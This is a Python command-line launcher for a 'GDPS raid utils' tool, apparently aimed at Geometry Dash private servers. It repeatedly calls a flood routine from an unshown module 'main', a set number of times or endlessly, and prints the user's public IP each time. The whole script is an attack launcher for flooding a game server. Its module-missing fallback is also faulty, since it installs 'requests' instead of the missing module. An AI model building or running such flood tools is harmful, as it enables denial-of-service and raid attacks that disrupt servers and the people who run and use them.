import os
import asyncio
import requests
try:
    import main
except ModuleNotFoundError:
    print("Modules aren't installed, wait please...")
    os.system("python -m pip install requests")
    import main
print("Welcome to the GDPS raid utils interface!")
input("Press Enter to continue...\n")
print("\nEnter the count of iterations to flood (0 to infinity, -1 to exit): ")
iters = int(input())
if(iters == -1):
    print("Exiting...")
if(iters == 0):
    while True:
        try:
            ipr = requests.get("http://ifconfig.me/ip")
            print("Your ip is ", ipr.text)
            asyncio.run(main.flood())
        except:
            print("Unstable network!")
else:
    for i in range(iters):
        try:
            ipr = requests.get("http://ifconfig.me/ip")
            print("Your ip is ", ipr.text)
            asyncio.run(main.flood())
        except:
            print("Unstable network!")
